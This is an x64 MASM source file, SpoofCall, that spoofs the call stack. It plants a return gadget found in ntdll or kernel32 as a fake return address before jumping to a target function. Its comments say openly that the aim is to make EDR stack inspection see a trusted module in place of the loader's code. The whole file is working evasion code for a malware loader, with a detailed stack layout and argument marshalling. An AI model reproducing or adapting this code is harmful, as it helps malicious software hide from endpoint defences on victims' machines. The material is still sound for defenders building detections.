; callstack_spoof.asm  —  x64 MASM
;
; SpoofCall(SpoofContext* ctx)
;
; Plants a fake return address inside a trusted module before JMPing to
; ctx->Target, so EDR stack inspection sees [Target] <- [gadget] rather
; than [Target] <- [loader code].
;
; Gadget contract: `add rsp, 0x68; ret`  (48 83 C4 68 C3)
;   InitCallstackSpoof() locates this sequence in ntdll/kernel32.
;
;   After Target RET:  RSP = target_rsp + 8
;   add rsp, 0x68:     RSP = target_rsp + 8 + 104 = target_rsp + 112
;   ret:               RIP = [target_rsp + 112] = real_return_addr   ✓
;
; Stack at JMP-to-Target (target_rsp = entry_rsp - 112):
;
;   target_rsp +   0   Gadget addr          <- Target RET
;   target_rsp +   8   shadow[0]            zeroed
;   target_rsp +  16   shadow[1]            zeroed
;   target_rsp +  24   shadow[2]            zeroed
;   target_rsp +  32   shadow[3]            zeroed
;   target_rsp +  40   StackArgs[0]         arg5  (StackArgCount >= 1)
;   target_rsp +  48   StackArgs[1]         arg6
;   target_rsp +  56   StackArgs[2]         arg7
;   target_rsp +  64   StackArgs[3]         arg8
;   target_rsp +  72   StackArgs[4]         arg9
;   target_rsp +  80   StackArgs[5]         arg10
;   target_rsp +  88   StackArgs[6]         arg11
;   target_rsp +  96   StackArgs[7]         arg12
;   target_rsp + 104   <Target fn ptr>      temp storage; skipped by gadget
;   target_rsp + 112   real_return_addr     <- gadget RET
;
; Alignment:
;   entry_rsp % 16 == 8  (CALL SpoofCall pushed 8 bytes onto 16-aligned rsp)
;   target_rsp = entry_rsp - 112;  112 % 16 == 0  ->  target_rsp % 16 == 8  ✓
;   This satisfies x64 ABI: rsp must be (16n + 8) at any CALL/JMP-as-CALL.
;
; Only volatile registers (rax, rcx, rdx, r8, r9, r10, r11) are used.
; Non-volatile registers are never touched, preserving the C++ caller's state.

.CODE

SpoofCall PROC
    ; rcx = SpoofContext*
    ; [rsp+0] = real_return_addr

    ; Load target and gadget from context before rcx is clobbered.
    mov     rax,  QWORD PTR [rcx]            ; rax = Target
    mov     r10,  QWORD PTR [rcx + 8]        ; r10 = Gadget
    mov     r11,  rcx                        ; r11 = context ptr

    ; Extend the stack: real_return_addr slides from [rsp+0] to [rsp+112].
    sub     rsp, 112

    ; [rsp+0]   = Gadget  (fake return address visible to Target)
    ; [rsp+104] = Target  (temporary storage; reload before JMP)
    mov     QWORD PTR [rsp],       r10
    mov     QWORD PTR [rsp + 104], rax

    ; Zero shadow space ([rsp+8..32])
    xor     r10, r10
    mov     QWORD PTR [rsp +  8],  r10
    mov     QWORD PTR [rsp + 16],  r10
    mov     QWORD PTR [rsp + 24],  r10
    mov     QWORD PTR [rsp + 32],  r10

    ; Zero stack-arg slots ([rsp+40..96]) before selectively filling them.
    mov     QWORD PTR [rsp + 40],  r10
    mov     QWORD PTR [rsp + 48],  r10
    mov     QWORD PTR [rsp + 56],  r10
    mov     QWORD PTR [rsp + 64],  r10
    mov     QWORD PTR [rsp + 72],  r10
    mov     QWORD PTR [rsp + 80],  r10
    mov     QWORD PTR [rsp + 88],  r10
    mov     QWORD PTR [rsp + 96],  r10

    ; Copy StackArgs from context into the stack-arg slots.
    ; r11 = context,  context.StackArgCount at +112,  context.StackArgs[i] at +48+8i
    mov     r10d, DWORD PTR [r11 + 112]      ; r10 = StackArgCount
    test    r10d, r10d
    jz      args_done                        ; count == 0: no stack args

    mov     rax,  QWORD PTR [r11 + 48]
    mov     QWORD PTR [rsp + 40],  rax       ; StackArgs[0] -> arg5
    cmp     r10d, 2
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 56]
    mov     QWORD PTR [rsp + 48],  rax       ; StackArgs[1] -> arg6
    cmp     r10d, 3
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 64]
    mov     QWORD PTR [rsp + 56],  rax       ; StackArgs[2] -> arg7
    cmp     r10d, 4
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 72]
    mov     QWORD PTR [rsp + 64],  rax       ; StackArgs[3] -> arg8
    cmp     r10d, 5
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 80]
    mov     QWORD PTR [rsp + 72],  rax       ; StackArgs[4] -> arg9
    cmp     r10d, 6
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 88]
    mov     QWORD PTR [rsp + 80],  rax       ; StackArgs[5] -> arg10
    cmp     r10d, 7
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 96]
    mov     QWORD PTR [rsp + 88],  rax       ; StackArgs[6] -> arg11
    cmp     r10d, 8
    jb      args_done

    mov     rax,  QWORD PTR [r11 + 104]
    mov     QWORD PTR [rsp + 96],  rax       ; StackArgs[7] -> arg12

args_done:
    ; Load register arguments for Target (clobbers rcx last to preserve r11).
    mov     rcx,  QWORD PTR [r11 + 16]      ; Arg1 -> Target's rcx
    mov     rdx,  QWORD PTR [r11 + 24]      ; Arg2 -> Target's rdx
    mov     r8,   QWORD PTR [r11 + 32]      ; Arg3 -> Target's r8
    mov     r9,   QWORD PTR [r11 + 40]      ; Arg4 -> Target's r9

    ; Reload Target from its stack slot and jump (not call).
    ; Target sees [rsp+0] = Gadget as its return address.
    ; Target returns to Gadget; Gadget's `add rsp, 0x68; ret` returns to
    ; real_return_addr with rax (NTSTATUS) intact.
    mov     rax,  QWORD PTR [rsp + 104]
    jmp     rax

SpoofCall ENDP

END
